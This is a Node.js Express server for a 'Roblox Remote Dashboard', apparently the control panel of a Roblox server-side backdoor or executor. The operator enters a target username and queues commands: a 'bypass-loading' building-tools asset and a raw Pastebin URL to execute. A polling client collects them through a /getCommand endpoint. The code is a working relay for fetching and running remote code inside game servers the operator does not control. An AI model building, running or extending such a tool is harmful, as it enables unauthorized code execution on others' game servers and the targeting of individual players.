const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

let commandQueue = [];

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Roblox Remote Dashboard</title>
            <style>
                :root { 
                    --bg: #0b0e14; 
                    --card-bg: #161b22; 
                    --text: #adbac7; 
                    --accent: #58a6ff; 
                    --border: #30363d; 
                    --success: #3fb950; 
                }
                body { 
                    font-family: 'Segoe UI', sans-serif; 
                    background-color: var(--bg); 
                    color: var(--text); 
                    margin: 0; 
                    display: flex; 
                    flex-direction: column; 
                    align-items: center; 
                    padding: 40px 20px; 
                }
                .header-section { text-align: center; margin-bottom: 40px; width: 100%; max-width: 800px; }
                h1 { color: #ffffff; margin-bottom: 25px; font-weight: 300; }
                .whitelist-box { 
                    background: #1c2128; 
                    padding: 20px; 
                    border-radius: 12px; 
                    border: 1px solid var(--accent); 
                    display: inline-block; 
                }
                label { display: block; margin-bottom: 12px; font-size: 11px; text-transform: uppercase; color: var(--accent); font-weight: bold;}
                input { 
                    background: #0d1117; border: 1px solid var(--border); color: white; 
                    padding: 12px 20px; border-radius: 6px; outline: none; width: 280px; text-align: center;
                }
                .status-info { font-size: 11px; margin-top: 20px; color: #768390; text-transform: uppercase; }
                #status { color: var(--success); font-weight: bold; }
                .grid { 
                    display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); 
                    gap: 25px; width: 100%; max-width: 850px; margin-top: 20px; 
                }
                .card { 
                    background: var(--card-bg); border: 1px solid var(--border); 
                    border-radius: 12px; overflow: hidden; transition: 0.3s; cursor: pointer; 
                }
                .card:hover { transform: translateY(-8px); border-color: var(--accent); }
                .card-image { width: 100%; height: 110px; background-size: cover; background-position: center; background-color: #21262d; }
                .card-content { padding: 20px; text-align: center; border-top: 1px solid var(--border); }
                .card-title { font-size: 17px; font-weight: 600; color: #ffffff; margin: 0; }
                .card-description { font-size: 13px; color: #768390; margin-top: 8px; }
            </style>
        </head>
        <body>
            <div class="header-section">
                <h1>Control Panel</h1>
                <div class="whitelist-box">
                    <label>Target Username</label>
                    <input type="text" id="usernameInput" placeholder="Enter Roblox Name..." oninput="updateUser()">
                </div>
                <div class="status-info">
                    Connection: <span id="status">Active</span> | 
                    User: <span id="displayUser" style="color:#fff">None</span>
                </div>
            </div>
            
            <div class="grid">
                <div class="card" onclick="send('142785488')">
                    <div class="card-image" style="background-image: url('https://raw.githubusercontent.com/crazy-invader135/RBLXSS/refs/heads/main/Images/F3X.png');"></div>
                    <div class="card-content">
                        <p class="card-title">F3X Tools</p>
                        <p class="card-description">Bypass-loading Building Tools.</p>
                    </div>
                </div>

                <div class="card" onclick="send('https://pastebin.com/raw/S8R3Y4Qy')">
                    <div class="card-image" style="background-image: url('https://tr.rbxcdn.com/30day-87612f0088922c0989f635038753239a/420/420/Image/Png');"></div>
                    <div class="card-content">
                        <p class="card-title">Pastebin Exec</p>
                        <p class="card-description">Run your main Pastebin script.</p>
                    </div>
                </div>
            </div>

            <script>
                const savedUser = localStorage.getItem('robloxWhitelist') || "";
                document.getElementById('usernameInput').value = savedUser;
                document.getElementById('displayUser').innerText = savedUser || "None";

                function updateUser() {
                    const val = document.getElementById('usernameInput').value;
                    localStorage.setItem('robloxWhitelist', val);
                    document.getElementById('displayUser').innerText = val || "None";
                }

                function send(id) {
                    const user = localStorage.getItem('robloxWhitelist');
                    if (!user || user === "") {
                        alert("Please enter a Target Username!");
                        return;
                    }
                    fetch('/send?id=' + encodeURIComponent(id) + '&target=' + encodeURIComponent(user));
                }

                setInterval(() => {
                    fetch('/ping').then(() => {
                        document.getElementById('status').innerText = "ONLINE";
                    }).catch(() => {
                        document.getElementById('status').innerText = "OFFLINE";
                    });
                }, 5000);
            </script>
        </body>
        </html>
    `);
});

// --- API ENDPOINTS ---

app.get('/send', (req, res) => {
    const { id, target } = req.query;
    if (id && target) {
        commandQueue.push({ id, target });
        console.log("Queued: " + id + " for " + target);
        res.send("OK");
    } else {
        res.status(400).send("Missing Params");
    }
});

app.get('/getCommand', (req, res) => {
    res.json(commandQueue.shift() || { id: null });
});

app.get('/ping', (req, res) => res.send("pong"));

app.listen(PORT, () => console.log("Server Live on Port " + PORT));
